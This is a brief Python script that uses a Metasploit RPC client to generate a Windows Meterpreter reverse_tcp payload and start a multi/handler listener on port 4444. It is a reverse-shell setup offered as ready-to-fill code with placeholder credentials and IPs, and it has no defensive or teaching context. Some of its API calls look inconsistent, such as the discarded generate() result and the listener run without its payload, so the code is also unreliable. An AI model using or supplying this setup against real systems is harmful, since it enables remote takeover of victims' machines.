from metasploit.msfrpc import MsfRpcClient

# Connect to the Metasploit RPC server
client = MsfRpcClient('your_metasploit_host', 'your_metasploit_port', 'your_metasploit_username', 'your_metasploit_password')

# Create a new payload
payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')

# Set the required options for the payload
payload['LHOST'] = 'your_local_ip'
payload['LPORT'] = 4444

# Generate the payload
payload.generate()

# Start the Metasploit listener
listener = client.modules.use('exploit', 'multi/handler')
listener['PAYLOAD'] = 'windows/meterpreter/reverse_tcp'
listener['LHOST'] = 'your_local_ip'
listener['LPORT'] = 4444

# Run the listener
listener.execute()
